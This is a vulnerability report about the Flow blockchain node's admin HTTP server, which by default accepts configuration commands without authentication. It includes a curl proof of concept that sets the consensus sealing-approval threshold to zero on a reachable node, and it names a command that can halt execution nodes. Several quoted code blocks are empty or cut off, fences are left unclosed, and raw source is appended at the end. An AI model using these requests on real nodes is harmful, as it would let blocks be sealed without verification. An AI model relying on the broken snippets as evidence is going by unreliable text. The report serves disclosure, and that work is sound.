### Title
Unauthenticated Admin HTTP Server Allows Any Reachable Actor to Set Critical Consensus Threshold Parameters — (`admin/command_runner.go`)

### Summary
The Flow node admin HTTP server exposes privileged configuration-setting commands with no built-in authentication by default. Any actor who can reach port 9002 can invoke `set-config` to set `consensus-required-approvals-for-sealing` to `0`, eliminating the verification approval requirement for block sealing — directly analogous to setting a withdrawal threshold to zero to freeze or bypass a critical protocol invariant.

### Finding Description

The `CommandRunner` in `admin/command_runner.go` starts two servers: a Unix-socket gRPC backend and an HTTP frontend bound to `r.httpAddress` (default port `9002`). The HTTP server is constructed with no authentication middleware:

```go
mux := http.NewServeMux()
mux.Handle("/", gwmux)
// ...
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,
}
``` [1](#0-0) 

TLS/mTLS is only applied when all three flags `--admin-cert`, `--admin-key`, and `--admin-client-cas` are explicitly provided by the operator:

```go
if node.AdminCert != NotSet {
    // ... load certs, set ClientAuth: tls.RequireAndVerifyClientCert
    opts = append(opts, admin.WithTLS(config))
}
``` [2](#0-1) 

When TLS is absent (the default), `ListenAndServe` is called with no authentication:

```go
if r.tlsConfig == nil {
    err = httpServer.ListenAndServe()
} else {
    err = httpServer.ListenAndServeTLS("", "")
}
``` [3](#0-2) 

The `runCommand` function processes every incoming request without any caller identity check:

```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    r.logger.Info().Str("command", command).Msg("received new command")
    req := &CommandRequest{Data: data}

    if handler := r.getHandler(command); handler != nil { ... }

The registered `set-config` command allows updating `consensus-required-approvals-for-sealing` at runtime:

```go
err = node.ConfigManager.RegisterUintConfig("consensus-required-approvals-for-sealing",
    setter.RequireApprovalsForSealConstructionDynamicValue,
    setter.SetRequiredApprovalsForSealingConstruction)
``` [5](#0-4) 

The `SetRequiredApprovalsForSealingConstruction` setter accepts `0` as a valid value because `DefaultRequiredApprovalsForSealValidation = 0`, and the validation only enforces `requiredApprovalsForSealVerification <= requiredApprovalsForSealConstruction`:

```go

    requiredApprovalsForSealVerification uint, chunkAlpha uint) error {
    if requiredApprovalsForSealVerification > requiredApprovalsForSealConstruction {
        return fmt.Errorf(...)
    }
``` [6](#0-5) 

Since `DefaultRequiredApprovalsForSealValidation = 0`, setting construction approvals to `0` passes validation: [7](#0-6) 

The `SetConfigCommand.Handler` then atomically stores the new value:

```go

``` [8](#0-7) 

Which calls:

```go

``` [9](#0-8) 

When `requiredApprovalsForSealConstruction == 0`, the `ApprovalCollector` immediately seals any result without waiting for any verification approvals:

```go

        _, err := collector.aggregatedSignatures.PutSignature(i, flow.AggregatedSignature{})
    }
    err := collector.SealResult()

### Impact Explanation

An attacker who can reach port 9002 on a consensus node can issue a single unauthenticated HTTP POST:

```
curl http://<consensus-node>:9002/admin/run_command \
  -d '{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}'
```

This atomically sets the approval threshold to zero on that node. The affected consensus node will then construct and propose seals for execution results without requiring any verification approvals, bypassing the verification layer entirely for blocks it seals. If the attacker reaches multiple consensus nodes (or a supermajority), invalid execution results can be sealed into the canonical chain, enabling unauthorized on-chain state changes.

Additionally, the `stop-at-height` command (also unauthenticated) can crash execution nodes: [11](#0-10) 

### Likelihood Explanation

The admin server binds to the address supplied via `--admin-addr`. In the localnet builder, this is hardcoded to `0.0.0.0:<AdminPort>`:

```go
fmt.Sprintf("--admin-addr=0.0.0.0:%s", testnet.AdminPort),
``` [12](#0-11) 

In benchnet2 production-like deployments, port 9002 is declared as an exposed service port: [13](#0-12) 

The README documents the server as reachable via plain `curl localhost:9002/...` with no authentication step shown: [14](#0-13) 

Any cloud misconfiguration, SSRF vulnerability in a co-located service, or container network exposure makes port 9002 reachable by an unprivileged external actor. Because TLS/mTLS is opt-in and not the default, most deployments that do not explicitly configure all three cert flags are vulnerable.

### Recommendation

1. **Require authentication by default**: Add an HTTP middleware layer that enforces authentication (e.g., a shared secret token, or mandatory mTLS) before any command is dispatched in `runAdminServer`. Do not make authentication opt-in.
2. **Bind to localhost by default**: Change the default `--admin-addr` to `127.0.0.1:9002` instead of allowing `0.0.0.0`.
3. **Separate read and write commands**: Apply stricter access control to state-mutating commands (`set-config`, `stop-at-height`, `ingest-tx-rate-limit set_config`) versus read-only commands.

### Proof of Concept

```bash
# No credentials required. Sets consensus approval threshold to 0 on a reachable node.
curl http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'

# Expected response: {"output":{"newValue":0,"oldValue":1}}
# Effect: consensus node now seals blocks with zero verification approvals,
# bypassing the verification layer for all subsequent seals it constructs.
```

func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}

func ValidateRequireApprovals(requiredApprovalsForSealConstruction uint, requiredApprovalsForSealVerification uint, chunkAlpha uint) error {
	// We need to ensure `requiredApprovalsForSealVerification <= requiredApprovalsForSealConstruction <= chunkAlpha`
	if requiredApprovalsForSealVerification > requiredApprovalsForSealConstruction {
		return fmt.Errorf("invalid consensus parameters, requiredApprovalsForSealVerification (%v)  > requiredApprovalsForSealConstruction (%v)",
			requiredApprovalsForSealVerification, requiredApprovalsForSealConstruction)
	}

	if requiredApprovalsForSealConstruction > chunkAlpha {
		return fmt.Errorf("invalid consensus parameters: requiredApprovalsForSealConstruction (%v) > chunkAlpha (%v)",
			requiredApprovalsForSealConstruction, chunkAlpha)
	}

	return nil
